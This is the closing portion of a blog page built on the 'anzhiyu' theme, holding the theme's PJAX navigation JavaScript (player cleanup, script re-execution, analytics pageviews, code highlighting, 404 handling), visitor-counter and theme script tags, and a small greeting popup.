
document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>